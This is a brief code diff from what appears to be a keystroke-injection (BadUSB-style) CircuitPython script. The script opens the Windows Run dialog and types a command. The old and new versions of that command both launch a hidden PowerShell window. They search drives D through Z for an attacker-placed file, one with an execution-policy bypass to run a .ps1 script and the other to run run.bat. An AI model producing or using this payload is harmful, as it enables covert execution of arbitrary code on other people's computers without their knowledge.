@@ -18,7 +18,7 @@ def type_and_enter(text):
 kbd.send(Keycode.GUI, Keycode.R)
 time.sleep(0.4)
 
-cmd = 'cmd /c for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %d:\.filename start powershell -w h -ep bypass -f "%d:\\filename.ps1"'
+cmd = 'powershell -w h "68..90|%{$d=[char]$_+\':\\run.bat\';if(test-path $d){&$d}}"'
 
 type_and_enter(cmd)
 
